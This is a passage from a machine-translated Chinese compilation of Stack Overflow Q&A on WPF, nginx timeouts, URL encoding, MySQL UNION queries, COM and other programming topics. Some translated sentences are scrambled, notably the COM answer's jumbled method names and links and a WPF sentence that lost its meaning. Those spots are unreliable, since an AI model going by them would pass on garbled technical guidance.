是的，你可以这样做——基本上你所要做的就是制作一个自定义控件模板。查看[http://www.switchonthecode.com/tutorials/the-wpf-tab-control-inside-and-out](http://www.switchonthecode.com/tutorials/the-wpf-tab-control-inside-and-out)获取教程。只需在谷歌上搜索“wpf”“tabcontrol”“shape”就会出现结果页面。

我自己没有尝试过，但是您应该能够将模板中的标签替换为标签以获得您想要的形状。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2019-03-15T15:37:34.193

为了倾斜**左右**标签边缘，这里是对[Slauma](https://stackoverflow.com/a/4741167/199364)对[rook 接受的答案](https://stackoverflow.com/a/1083133/199364)的增强的修改。这是 ContentToPathConverter 类的 Convert 方法的替换：

```
 public object Convert(object value, Type targetType, object parameter, System.Globalization.CultureInfo culture)
    {
        var ps = new PathSegmentCollection(4);
        ContentPresenter cp = (ContentPresenter)value;
        double h = cp.ActualHeight > 10 ? 1.4 * cp.ActualHeight : 10;
        double w = cp.ActualWidth > 10 ? 1.25 * cp.ActualWidth : 10;
        // Smaller unit, so don't need fractional multipliers.
        double u = 0.1 * h;
        // HACK: Start before "normal" start of tab.
        double x0 = -4 * u;
        // end of transition
        double x9 = w + 8 * u;
        // transition width
        double tw = 8 * u;
        // top "radius" (actually, gradualness of curve. Larger value is more rounded.)
        double rt = 5 * u;
        // bottom "radius" (actually, gradualness of curve. Larger value is more rounded.)
        double rb = 3 * u;
        // "(x0, 0)" is start point - defined in PathFigure.
        // Cubic: From previous endpoint, 2 control points + new endpoint.
        ps.Add(new BezierSegment(new Point(x0 + rb, 0), new Point(x0 + tw - rt, h), new Point(x0 + tw, h), true));
        ps.Add(new LineSegment(new Point(x9 - tw, h), true));
        ps.Add(new BezierSegment(new Point(x9 - tw + rt, h), new Point(x9 - rb, 0), new Point(x9, 0), true));

        // "(x0, 0)" is start point.
        PathFigure figure = new PathFigure(new Point(x0, 0), ps, false);
        PathGeometry geometry = new PathGeometry();
        geometry.Figures.Add(figure);

        return geometry;
    } 
```

同样在 TabControl 的 ControlTemplate 中，向选项卡项的容器添加左侧（和可选的右侧）边距（添加了唯一的更改`Margin="20,0,20,0"`）：

```
<Style x:Key="TabControlStyle" TargetType="{x:Type TabControl}">
    ...
    <Setter Property="Template">
        ...
        <StackPanel Grid.Row="0" Panel.ZIndex="1" Orientation="Horizontal" IsItemsHost="true" Margin="20,0,20,0"/> 
```

* * *

问题：当不是选定的选项卡时，选项卡左边缘底部有轻微的视觉“故障”。我认为这与在选项卡区域开始之前开始“倒退”有关。或者与在选项卡底部绘制线条有关（不知道我们在选项卡“正常”矩形的左边缘之前开始）。

# database - 管理经常性日历数据

> ID：561933
> 
> 赞同：4
> 
> 时间：2009-02-18T16:57:59.733
> 
> 标签：database, schema, calendar

我必须构建一个具有事件日历部分的网络应用程序。与 Outlook 一样，要求是用户可以设置循环事件，并且可以在一系列事件中移动单个事件。

1.  可以使用哪些方法来存储（在数据库中）可以描述系列重复模式的各种方式？
2.  如何记录异常？
3.  您使用什么策略来管理重新定义系列及其对异常的影响？

我已经做过几次了，不同的是，但我想看看其他人是如何解决这个问题的。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-02-18T17:02:37.430

看看[iCal 格式如何处理重复模式](http://www.kanzaki.com/docs/ical/recur.html)和[重复异常](http://www.kanzaki.com/docs/ical/exdate.html)。如果您想在某个时候发布事件，无论如何您都很难避免使用 iCal，因此您最好从一开始就以兼容的方式进行。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-02-18T17:02:49.567

一方面：如果您还不熟悉它，请查看[RFC 5545](http://www.ietf.org/rfc/rfc5545.txt)（它取代了[RFC 2445](http://www.ietf.org/rfc/rfc2445.txt)），它为这种模式定义了 iCalendar 规范。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-18T17:04:32.417

我通常提供前端逻辑，允许用户指定重复事件，但实际上使用单独的数据库条目将事件记录为 SQL 服务器中的单独记录。

换句话说，他们可以指定每周一晚上 7 点的会议，但我记录了一年的 52 条记录，以便可以更改、删除单个会议或在这些事件中添加其他信息。

我提供了允许用户取消所有未来事件的方法，然后在需要时重新输入新的重复系列。

我还没有想出一个完美的方法来处理这个问题，所以我会监控这个线程，看看是否有任何好的建议出现。

# java - CFHTTP：找出受支持的 SSL 版本并使用 SSL 3.0 测试 auth.net

> ID：561938
> 
> 赞同：2
> 
> 时间：2009-02-18T16:59:24.643
> 
> 标签：java, ssl, coldfusion, https, authorize.net

我最近收到了一封来自 Authorize.net 的电子邮件，内容是：

> 在 2009 年 3 月 16 日至 20 日这一周，Authorize.Net 将弃用对 SSL 2.0 协议的所有旧版支持。最近对支付卡行业数据安全标准 (PCI DSS) 进行了更改，使 SSL 2.0 的使用违反了 PCI DSS。

所以问题是：如何确保我的 ColdFusion 应用程序使用 cfhttp 与 auth.net 服务通信，不会在 3 月份损坏？

试图找出支持的 SSL 版本，但找不到此类信息。

有什么建议么？

**编辑**

发现讨论：[一](http://www.mail-archive.com/cf-talk@houseoffusion.com/msg333306.html)和[二](http://www.nabble.com/CFHTTP-and-SSL-v3-td22066938.html)。似乎唯一可靠的方法是升级到CF8。

那么，现在还有其他问题：如何使用新的 auth.net 协议测试我的代码？有什么方法可以在上线之前切换开发环境？

我还向 auth.net 的开发支持发送了电子邮件，提出了这些问题。如果他们能为我提供解决方案 - 将在此处发布。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-18T17:32:53.597

这是 www.talkingtree.com 上关于此事的一篇不错的文章：

[ColdFusion 协议标签 CFHTTP、CFINVOKE、CFLDAP 支持 SSLv2](http://www.talkingtree.com/blog/index.cfm/2006/11/14/ColdFusion-Protocol-Tags-CFHTTP-CFINVOKE-CFLDAP-support-SSLv2)

看起来 CF8 是第一个支持 SSLv3 的版本。

您还可以真正弄脏自己的手并[使用 Java 直接发出 SSLv3 请求](http://www.mail-archive.com/cf-talk@houseoffusion.com/msg333277.html)。这当然需要更改工作代码以模拟 CF8 自带的功能。但是，如果升级不是您的选择，也许这是一个可行的选择。

恐怕我不能说太多关于如何针对 Authorize.net 测试你的代码。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-25T21:04:10.773

好的，最后神说话了——Auth.net 开发者回复：

> 我们建议每个用户验证他们的服务器 SSL 加密协议设置。如果您不确定在哪里可以找到它们，请在 Google 搜索服务器类型以及 SSL 3.0 时提供这方面的有用信息。此外，服务器支持资源应提供此信息。
> 
> **此更改已发布到测试环境**。如果您愿意，您可以使用以下共享测试帐户进行测试：
> 
> 登录ID：xxxxxxxx
> 
> 密码：xxxxxxxxx
> 
> 登录网址：[https ://test.authorize.net](https://test.authorize.net)
> 
> API 登录 ID：xxxxxxxx
> 
> 交易密钥：xxxxxxxxx
> 
> 发布到 URL：[https ://test.authorize.net/gateway/transact.dll](https://test.authorize.net/gateway/transact.dll)

**注意：**这是新的测试帐号，但我认为现在所有测试帐号都已更改，将尝试测试。

至少，现在我能够在更改生效之前在沙盒中测试我的交易，这就是我想要的。

# asp.net - 经典 ASP、ASP.NET、IFrame 和 response.redirect 问题

> ID：561940
> 
> 赞同：1
> 
> 时间：2009-02-18T16:59:43.863
> 
> 标签：asp.net, iframe

客户端有一个带有 iframe 的 asp 页面。iframe 在 asp 经典页面中加载一个 asp.net 页面。

ASP.NET 页面负责连接到 Web 服务，显示一些数据，然后当用户单击按钮时，它会响应。重定向另一个经典的 ASP 页面。

由于 asp.net 页面位于 iframe 中，因此当理想情况下它应该接管整个页面时，asp 页面会在 iframe 中加载。

我曾尝试将 javascript 放在最终的 asp 页面中以突破 iframe，但它似乎没有触发。

我尝试在 asp.net 页面上执行 onClientCLick() 并使用以下 javascript 使其脱离 iframe

top.location = self.location.href

但是由于它设置了位置，它似乎刷新了页面，打破了 iframe，但不会触发服务器端 onclick 事件，该事件随后将执行后端计算并执行 response.redirect。

关于如何确保最终的 asp 页面不会出现在 iframe 中并从中中断的任何想法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-02-18T17:19:57.497

听起来您需要将控制权返回给父窗口。您可以通过 javascript 执行此操作：

```
function returnControl(returnPage).
{

  parent.window.location.href = returnPage; 

} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-26T13:26:20.067

我只是在指向主 asp 页面的链接中使用了“target=_top”。奇迹般有效。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-18T17:30:35.740

你可以再做一件事（我已经实现了）。首先调用 onClick 事件的后端计算，然后将用户重定向到另一个 asp.net 页面，该页面可以在页面加载时使用 javascript 函数将结果页面加载到父窗口中。

# com - 理解 MSDN COM 文档的秘诀是什么？

> ID：561944
> 
> 赞同：4
> 
> 时间：2009-02-18T17:00:10.900
> 
> 标签：com, msdn

我正在寻找一种“典型”的方式来导航 MSDN 以获得一个 COM 类来做他们想做的事。

示例问题：我正在寻找一种 API 方法来解除对本地文件的阻止（以编程方式从文件中删除 Internet 区域/网络标记）。

我在 stackoverflow.com 上发现了一篇关于 clsid_persistentzoneidentifier 的帖子。所以我在 MSDN 中搜索并访问了[http://msdn.microsoft.com/en-us/library/ms537029(VS.85).aspx](http://msdn.microsoft.com/en-us/library/ms537029(VS.85).aspx)。我正在寻找的是他们到达此网址后所做的事情。从这个位置，我无法弄清楚操作的顺序应该是什么。如何将此 IZoneIdentifier 连接到 IPersistFile？等等。必须有一些基本的东西，我错过了与 COM 相关的文档。MSDN 有接口和对象，但没有任何东西可以帮助我可视化各种“序列”图。没有什么能让我理解哪些 COM 对象来自同一个类。因此可以/或应该是 QueryInterfaced，应该是 CoCreated。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-02-18T17:10:27.520

这方面的文档表明了一些事情。

第一个是你可以调用[`CoCreateInstance`](http://msdn.microsoft.com/en-us/library/ms686615%28v=vs.85%29.aspx), 传递[`CLSID_PersistentZoneIdentifier`](http://msdn.microsoft.com/en-us/library/ms537029%28v=vs.85%29.aspx)来获取这两个接口的实现：

*   [`IPersistFile`](http://msdn.microsoft.com/en-us/library/ms687223%28v=VS.85%29.aspx)
*   [`IZoneIdentifier`](http://msdn.microsoft.com/en-us/library/ms537032%28v=VS.85%29.aspx)

它还说：

> 用于`IPersistFile`将对象附加到目标文件并`IZoneIdentifier` 检查或操作区域 ID。

话虽如此，您可以在`IPersistFile`此处查看文档：

[http://msdn.microsoft.com/en-us/library/ms687223(VS.85).aspx](http://msdn.microsoft.com/en-us/library/ms687223(VS.85).aspx)

它表明有一个[`Load`方法](http://msdn.microsoft.com/en-us/library/ms687284%28v=VS.85%29.aspx)，你想用文件名调用它来加载包含文件详细信息的实现。

从那里，您可以调用[接口](http://msdn.microsoft.com/en-us/library/ms680509%28v=VS.85%29.aspx)实现以获取接口，然后调用其上的[`QueryInterface`](http://msdn.microsoft.com/en-us/library/ms682521%28v=vs.85%29.aspx)方法[将](http://msdn.microsoft.com/en-us/library/ms537034%28v=VS.85%29.aspx)区域设置为本地计算机。[`IUnknown`](http://msdn.microsoft.com/en-us/library/ms680509%28v=VS.85%29.aspx)`IZoneIdentifier`[`Remove`](http://msdn.microsoft.com/en-us/library/ms537034%28v=VS.85%29.aspx)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-18T17:07:13.080

为此，如果从文档中看不出来，我喜欢找到使用相关 API 的示例程序：使用 Google，或者可能来自任何相关的 Microsoft SDK。

Microsoft SDK，[例如这个](http://en.wikipedia.org/wiki/Microsoft_Windows_SDK#Windows_SDK_samples)，包括示例程序。

# configuration - 如何在 Nginx 上使用 FastCGI 防止网关超时

> ID：561946
> 
> 赞同：212
> 
> 时间：2009-02-18T17:01:26.293
> 
> 标签：configuration, nginx, fastcgi

我正在运行 Django、FastCGI 和 Nginx。我正在创建一种 API，有人可以通过 XML 发送一些数据，我将处理这些数据，然后为每个发送过来的节点返回一些状态代码。

问题是，如果我处理 XML 的时间太长，Nginx 会抛出 504 Gateway Time-out ——我认为超过 60 秒。

所以我想设置 Nginx，这样如果任何与位置 /api 匹配的请求都不会超时 120 秒。什么设置将实现这一点。

到目前为止，我所拥有的是：

```
 # Handles all api calls
    location ^~ /api/ {
        proxy_read_timeout 120;
        proxy_connect_timeout 120;
        fastcgi_pass 127.0.0.1:8080;
    } 
```

编辑：我没有工作:)

* * *

## 回答 #1

> 赞同：252
> 
> 时间：2009-02-18T19:34:13.790

代理超时很好，对于代理，而不是 FastCGI...

`client_header_timeout`影响 FastCGI 超时的指令是`client_body_timeout`和`send_timeout`。

**编辑**：考虑到 nginx wiki 上的内容，[send_timeout 指令](http://nginx.org/en/docs/http/ngx_http_fastcgi_module.html#fastcgi_send_timeout)负责设置响应的一般超时（这有点误导）。对于 FastCGI，有`fastcgi_read_timeout`哪些影响[FastCGI 进程响应超时](http://nginx.org/en/docs/http/ngx_http_fastcgi_module.html#fastcgi_read_timeout)。

* * *

## 回答 #2

> 赞同：24
> 
> 时间：2012-12-11T15:48:33.057

对于那些将 nginx 与 unicorn 和 rails 一起使用的人，很可能超时在您的`unicorn.rb`文件中

在 unicorn.rb 中设置一个大的超时时间

```
timeout 500 
```

如果您仍然遇到问题，请尝试在 nginx 的上游设置 fail_timeout=0 ，看看这是否解决了您的问题。这是出于调试目的，在生产环境中可能很危险。

```
upstream foo_server {
        server 127.0.0.1:3000 fail_timeout=0;
} 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2017-01-30T20:14:03.433

**在`http`nginx 部分 (/etc/nginx/nginx.conf) 添加或修改：**

```
keepalive_timeout 300s 
```

**在`server`nginx 部分 (/etc/nginx/sites-available/your-config-file.com) 添加以下行：**

```
client_max_body_size 50M;
fastcgi_buffers 8 1600k;
fastcgi_buffer_size 3200k;
fastcgi_connect_timeout 300s;
fastcgi_send_timeout 300s;
fastcgi_read_timeout 300s; 
```

**在`php`文件 127.0.0.1:9000 (/etc/php/7.X/fpm/pool.d/www.conf) 的情况下修改：**

```
request_terminate_timeout = 300 
```

我希望能帮助你。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2015-12-09T00:55:39.490

如果你使用独角兽。

在`top`你的服务器上查看。Unicorn 现在可能正在使用 100% 的 CPU。这个问题有几个原因。

*   您应该检查您的 HTTP 请求，其中一些可能非常困难。

*   检查独角兽的版本。可能是您最近更新了它，并且出现了问题。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2020-03-17T14:25:02.280

在这样的服务器代理集中

```
location / {

                proxy_pass http://ip:80;                

                proxy_connect_timeout   90;
                proxy_send_timeout      90;
                proxy_read_timeout      90;

            } 
```

在这样的服务器 php 设置中

```
server {
        client_body_timeout 120;
        location = /index.php {

                #include fastcgi.conf; //example
                #fastcgi_pass unix:/run/php/php7.3-fpm.sock;//example veriosn

                fastcgi_read_timeout 120s;
       }
} 
```

# c++ - 有哪些 C++ 标准库使用最佳实践？

> ID：561949
> 
> 赞同：4
> 
> 时间：2009-02-18T17:02:02.377
> 
> 标签：c++, stl

我正在学习 C++，而我正在阅读的书（C++ 编程语言）说不要重新发明轮子，而是要依赖标准库。在 C 中，我经常最终创建一个链表，并且一遍又一遍地迭代链表（也许我做错了不确定），所以 C++ 中可用的容器、字符串和算法的想法真的很吸引我. 但是我在网上看了一点，听到了一些朋友和同事对 STL 的批评，所以我想我可能会在这里挑选一些大脑。

使用 STL 有哪些最佳实践，您从 STL 中学到了哪些经验教训？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2009-02-18T17:16:23.760

Effective C++ 系列有一本配套书，叫做《[Effective STL](http://www.amazon.co.uk/Effective-STL-Specific-Professional-Computing/dp/0201749629)》。这是学习使用标准 C++ 库 (neé STL) 的最佳实践的良好起点。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2009-02-18T17:04:14.430

您可能想要获取一份“有效的 C++：改进程序和设计的 50 种特定方法（第 2 版）”的副本：

[http://www.amazon.com/Effective-Specific-Addison-Wesley-Professional-Computing/dp/0201924889](https://rads.stackoverflow.com/amzn/click/com/0201924889)

我发现它非常宝贵，即使您不是使用 C++ 编程，它在今天仍然非常重要。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2009-02-18T17:06:10.337

如果你真的想学习 C++ 标准库（其中包括像字符串这样的东西，传统上不被视为 STL 的一部分），你需要一本好书。这方面最好的一个是[Nicolai Jossutis 的“C++ 标准库”](http://www.josuttis.com/libbook/)。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2009-02-18T17:26:28.497

当 SC++L 不适合使用时，我能想到的唯一情况是一些罕见的情况，其中要么没有提供适当的实现（也许你正在一些晦涩的平台上工作，只有已实现有限的 C++ 编译器）或需要极高的性能（也许对于存在于下一代游戏图形渲染系统核心的代码）。

如果您使用的是普通计算机，则 99% 确定您不是第一种情况。至于第二种情况，如果您有来自良好分析工具的明确证据表明您的程序中的瓶颈是 SC++L，那么您绝对应该出于性能原因考虑实现自己的一组容器和算法。

关于 SC++L 的最佳实践是尽可能简单地使用它。此外，几乎所有现代 C++ 代码都大量使用[Boost](http://www.boost.org/)，您可以将其视为对 SC++L 的出色且大规模的扩展。每当您发现自己想做一个相当标准的算法任务时，您应该使用 Google 来查看 SC++L 或 Boost 是否提供了预制的、经过测试的、经过验证的工具来完成此任务。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2009-02-18T17:16:11.623

你为什么不告诉我们这些批评，我们会回应？如果批评是有效的，我们会告诉你的。如果他们不是，我们会告诉你为什么不。

STL 的历史参差不齐，因为最初，1) 很少有人理解它，2) 很少有编译器能正确实现它。但那是十年前的事了。今天？有用。这是有效的。它解决了很多问题。它最大的问题是你需要一些时间来理解它是如何工作的。

最简单的最佳实践是“只要 STL 提供您需要的功能就使用它”。除非我们知道它面临的批评是什么，否则很难提供更具体的建议。

但总的来说，批评它的人通常*不是 C++ 程序员*。已经学会使用类的 C 程序员属于这一类。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2009-02-18T18:08:20.733

STL 是由最优秀的大脑编写的。在大多数情况下，您可能不会想出比这更好的实现。它的性能很好，没有错误，是方法、API、代码组件之间传递参数的良好标准，不用说，它封装了所有丑陋的东西。问题是，您必须知道如何为您的问题选择合适的容器。否则，您可能无法享受它的好处。网上有一些关于如何选择正确的 STL 容器的文章。一个很好的链接是：[STL Containers](http://linuxsoftware.co.nz/cppcontainers.html) ，它有一个很好的流程图来说明如何选择你的容器。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-02-18T17:06:16.127

您应该了解*模板*和其他*多态性*的概念，以便有效地使用 STL。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2009-02-18T17:12:46.780

要了解 STL，您需要了解模板，并且您应该擅长数据结构。

# c# - ASP.Net URLEncode & 用于查询字符串

> ID：561954
> 
> 赞同：23
> 
> 时间：2009-02-18T17:03:01.000
> 
> 标签：c#, asp.net, query-string

我需要重定向到将参数作为查询字符串传递的 url。

这可以在值中包含与号。如

```
string value = "This & That";
Response.Redirect("http://www.example.com/?Value=" + Server.UrlEncode(value)); 
```

然而，这会返回[http://www.example.com/?Value=This+&+That](http://www.example.com/?Value=This+&+That)

我应该用什么来编码这个字符串？

编辑：感谢卢克指出显而易见的，代码确实可以正常工作。我道歉，我的问题毕竟不是一个有效的问题！

我将要访问的页面有很多旧的遗留代码，这些代码显然在进行某种编码和解码，使其看起来好像我的 urlencode 不起作用。

不幸的是，我的解决方案是完全放弃使用 &，直到可以重写相关代码。你不只是讨厌旧代码！

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2009-02-18T17:41:32.047

该[文档](http://msdn.microsoft.com/en-us/library/zttxte6w.aspx)建议`Server.UrlEncode`应该正确处理＆符号。

我刚刚测试了您的确切代码，并且返回的字符串已正确编码：

> [http://www.example.com/?Value=这个+%26+那个](http://www.example.com/?Value=This+%26+That)

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2009-02-18T17:05:32.070

技术上做：

```
value = value.Replace("&", "%26") 
```

会成功的。

编辑：整个 UrlEncode/HttpEncode 方法似乎存在一些棘手的问题，这些问题并不能完全解决问题。不久前我写了一个简单的方法，可能会派上用场。这应该涵盖所有主要的编码问题，并且也很容易编写“去消毒剂”。

```
Protected Function SanitizeURLString(ByVal RawURLParameter As String) As String

      Dim Results As String

      Results = RawURLParameter    

      Results = Results.Replace("%", "%25")
      Results = Results.Replace("<", "%3C")
      Results = Results.Replace(">", "%3E")
      Results = Results.Replace("#", "%23")
      Results = Results.Replace("{", "%7B")
      Results = Results.Replace("}", "%7D")
      Results = Results.Replace("|", "%7C")
      Results = Results.Replace("\", "%5C")
      Results = Results.Replace("^", "%5E")
      Results = Results.Replace("~", "%7E")
      Results = Results.Replace("[", "%5B")
      Results = Results.Replace("]", "%5D")
      Results = Results.Replace("`", "%60")
      Results = Results.Replace(";", "%3B")
      Results = Results.Replace("/", "%2F")
      Results = Results.Replace("?", "%3F")
      Results = Results.Replace(":", "%3A")
      Results = Results.Replace("@", "%40")
      Results = Results.Replace("=", "%3D")
      Results = Results.Replace("&", "%26")
      Results = Results.Replace("$", "%24")

      Return Results

End Function 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2018-11-29T08:10:29.183

在 .net core 2.1 版（2018 年末）中，我能够使用以下内容：

```
System.Web.HttpUtility.UrlEncode(string_to_encode) 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2010-09-22T16:18:07.770

另一个需要转义的字符是撇号。将其替换为 %27。

`string url = Server.UrlEncode(value).Replace("'", "%27);`

HttpUtility.UrlEncode() 和 Server.UrlEncode() 不会与其他几个字符一起替换此字符，以便与其他 .Net 框架向后兼容。有关详细信息，请参阅这篇微软文章： [http ://connect.microsoft.com/VisualStudio/feedback/details/214349/httputility-urlencode-does-not-encode-apostrophe](http://connect.microsoft.com/VisualStudio/feedback/details/214349/httputility-urlencode-does-not-encode-apostrophe)

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2011-03-25T13:19:51.053

这是正确的，但是如果您在查询字符串中有多个参数。

例如：&firstname=bob&secondName="Tracy and John"

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2012-06-20T13:55:34.073

您必须使用`Server.UrlEncode(string containing the ampersand)`.

我刚刚对其进行了测试，返回的查询字符串被正确编码然后解码。

`HttpUtility`不适用于此操作。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2012-03-16T14:49:00.397

如果您从 a 中获得价值，`GridView`则`& ampersand`很可能会显示为`"&amp;"`：

```
row.Cells[4].Text.ToString() = xxxx&amp; 
```

因此，在这种情况下，您将需要使用：

```
.Replace("&amp;", "%26") 
```

# php - 用户最近的活动 - PHP MySQL

> ID：561961
> 
> 赞同：9
> 
> 时间：2009-02-18T17:03:43.870
> 
> 标签：php, mysql

我有 3 个 MySQL 表代表：用户帖子的照片、用户帖子的视频、用户帖子的评论，我需要查看用户最近的 10 个（20、30、40 ......）活动。

例如在照片表中可能由以下组成：

```
user_id | photo_id   | photo_path | photo_name | date_added
   5    |     18     |  /photos   | pht_18.png |  2009-02-12
   5    |     21     |  /photos   | pht_21.png |  2009-02-15
   5    |     29     |  /photos   | pht_29.png |  2009-03-30 
```

视频表

```
user_id | video_id   |  video_url       |   date_added
   5    |     36     |  youtube.com/... |   2009-01-09
   5    |     48     |  youtube.com/... |   2009-02-18
   5    |     90     |  youtube.com/... |   2009-03-19 
```

评论表

```
user_id | comment_id |   comment     |  date_added
   5    |     6      |   hi!         |  2009-02-11
   5    |     11     |   great photo |  2009-02-13
   5    |     19     |   nice shot!  |  2009-03-28 
```

如您所见，这 3 个表具有不同数量的属性，那么我该如何进行联合呢？在获取查询结果时，我如何理解它属于哪个表？

因此，在用户个人资料页面中，我想以这种方式显示他最近按 DATE DESC 排序的活动：

```
2009-09-01: user posted a video
2009-11-02: user posted a comment
2009-12-02: user posted a photo
2009-13-02: user posted a comment
2009-15-02: user posted a photo
2009-18-02: user posted a video
2009-19-03: user posted a video
2009-28-03: user posted a comment
2009-30-03: user posted a photo 
```

任何人都可以帮助我吗？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2009-02-18T17:10:17.130

MySQL UNION 查询可以在这里工作：

```
(SELECT `user_id`, `date_added`, 'photo' AS `type` FROM `photos` WHERE `user_id` = uid) UNION
 (SELECT `user_id`, `date_added`, 'video' AS `type` FROM `videos` WHERE `user_id` = uid) UNION
 (SELECT `user_id`, `date_added`, 'comment' AS `type` FROM `comments` WHERE `user_id` = uid)
 ORDER BY `date_added` DESC; 
```

然后你会得到一个结果集，比如

```
user_id | date_added | type
    5   | 2009-01-03 | photo
    5   | 2008-12-07 | video
    5   | 2008-11-19 | comment 
```

等等。（实际上`user_id`，如果您愿意，您可以不选择 SELECT，当然）

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-02-18T17:15:20.923

为什么你首先有单独的表格？这可能是数据库设计中的一个错误。

[***编辑****：通过评论和问题编辑证明，OP有正当理由维护三个表格。关于此的进一步建议已删除。*]

要解决您的问题，您可以使用 UNION 或 UNION ALL：

```
(SELECT 'photo'   AS item_type, date_added, user_id FROM photos)
UNION ALL
(SELECT 'video'   AS item_type, date_added, user_id FROM videos)
UNION ALL
(SELECT 'comment' AS item_type, date_added, user_id FROM comments)
ORDER BY date_added DESC 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-02-18T18:12:55.357

就个人而言，我会制作另一个表来存储任何活动。它会大大简化事情，您还可以跟踪删除和其他活动。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-02-18T17:11:34.163

如果是我，我只会对每个表进行查询并选择 N 个最近的项目（按 date_added desc 限制 N 排序），然后在 PHP 中合并它们。这样，如果您需要在单独的物理机器上托管表，您就会受到保护。

您也可能会问自己为什么需要 3 张桌子。也许 1 个带有 activity_type 列的表就足够了。这可能会使以后添加更多活动类型变得更加容易。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-02-18T17:11:29.840

[`UNION`](http://dev.mysql.com/doc/refman/5.1/en/union.html)在这些表上做一个：

```
(SELECT "photo" AS `table`, `date_added` FROM `photos` ORDER BY `date_added` LIMIT 10)
UNION
(SELECT "video" AS `table`, `date_added` FROM `videos` ORDER BY `date_added` LIMIT 10)
UNION
(SELECT "comment" AS `table`, `date_added` FROM `comments` ORDER BY `date_added` LIMIT 10)
ORDER BY `date_added` DESC
LIMIT 10; 
```

# cocoa - 隐藏 NSWindowToolbarButton

> ID：561970
> 
> 赞同：0
> 
> 时间：2009-02-18T17:06:17.140
> 
> 标签：cocoa, hide, toolbar

我该怎么做才能将它隐藏`NSWindowToolbarButton`在带有 的 Windows 中`NSToolbar`？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-18T17:18:01.010

在 Interface Builder 中的窗口检查器的属性选项卡的外观部分中有一个复选框。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-18T17:13:58.120

我有它...

```
[NSWindow setShowsToolbarButton:NO] 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-18T22:42:04.273

仅供参考，如果您需要访问任何窗口按钮，或者要了解特定窗口是否有某个按钮，您可以使用`standardWindowButton:`查看相应的[Apple Docs](http://developer.apple.com/documentation/Cocoa/Reference/ApplicationKit/Classes/NSWindow_Class/Reference/Reference.html#//apple_ref/occ/instm/NSWindow/standardWindowButton:)

# wcf - 我可以在 WCF 中向客户端返回异常的最后一刻是什么时候？

> ID：561981
> 
> 赞同：0
> 
> 时间：2009-02-18T17:07:34.127
> 
> 标签：wcf, nhibernate, exception, unit-of-work

假设我在 IInstanceProvider 的实现中有这个：

```
public void ReleaseInstance(InstanceContext instanceContext, object instance)
{
    try
    {
        unitOfWork.Commit();
    }
    catch (Exception)
    {
        unitOfWork.Rollback();
        throw;
    }
    finally
    {
        unitOfWork.Dispose();
    }
} 
```

那个**投掷；**永远不会返回给客户端，因为它是在服务完成它的工作并将数据返回给客户端并因此完成之后才被调用的。我还能如何返回异常？或者有更好的地方来做这件事吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-02-18T17:15:47.867

我认为您正在寻找错误的地方来执行此操作。我认为更好的选择是实现 IDispatchMessageInspector 接口并将其附加到 DispatchRuntime 上 MessageInspectors 属性公开的集合（很可能通过行为）。

有了这个，您可以检查传入和传出的消息，并在需要时修改它们（这是您的异常将如何实现，作为返回消息中的错误）。因此，您不仅会让异常冒泡，而是将其更改为错误消息并将返回消息设置为该消息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-19T13:59:10.700

我对 WCF 中的事务并不熟悉。上面代码中的什么将结果返回给客户端？是回滚吗？

# python - 检测python中的文件句柄泄漏？

> ID：561988
> 
> 赞同：7
> 
> 时间：2009-02-18T17:09:13.607
> 
> 标签：python, file, handle

我的程序似乎正在泄漏文件句柄。我怎样才能知道在哪里？

我的程序在几个不同的地方使用文件句柄——子进程的输出，调用`ctypes`API (ImageMagick) 打开文件，然后复制它们。

它崩溃了`shutil.copyfile`，但我很确定这不是它泄漏的地方。

```
Traceback (most recent call last):
  File "<string>", line 1, in <module>
  File "C:\Python25\Lib\site-packages\magpy\magpy.py", line 874, in main
    magpy.run_all()
  File "C:\Python25\Lib\site-packages\magpy\magpy.py", line 656, in run_all
    [operation.operate() for operation in operations]
  File "C:\Python25\Lib\site-packages\magpy\magpy.py", line 417, in operate
    output_file = self.place_image(output_file)
  File "C:\Python25\Lib\site-packages\magpy\magpy.py", line 336, in place_image
    shutil.copyfile(str(input_file), str(self.full_filename))
  File "C:\Python25\Lib\shutil.py", line 47, in copyfile
    fdst = open(dst, 'wb')
IOError: [Errno 24] Too many open files: 'C:\\Documents and Settings\\stuart.axon\\Desktop\\calzone\\output\\wwtbam4\\Nokia_NCD\\nl\\icon_42x42_V000.png'
Press any key to continue . . . 
```

* * *

## 回答 #1

> 赞同：4
> 
